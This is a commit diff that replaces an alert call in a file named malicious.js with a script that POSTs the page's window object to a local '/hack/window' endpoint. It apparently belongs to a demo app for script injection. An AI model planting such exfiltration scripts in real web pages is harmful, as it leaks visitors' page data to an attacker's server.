5f641602f9adc080234fd23976fde9430a0030ae
Brion <info@brionmario.com>
2024-05-28 13:08:52 +0530

    chore: update `malicisou.js`

--- apps/client/public/resources/malicious.js
+++ apps/client/public/resources/malicious.js
@@ -1,1 +1,15 @@
-alert('hi');
+// write a logic to get the window object and send it to http://localhost:3002/hack/window as a POST message
+
+console.log('malicious.js loaded');
+
+fetch('http://localhost:3002/hack/window', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+  },
+  body: JSON.stringify({window}),
+})
+  .then(res => res.json())
+  .then(data => {
+    console.log(data);
+  });
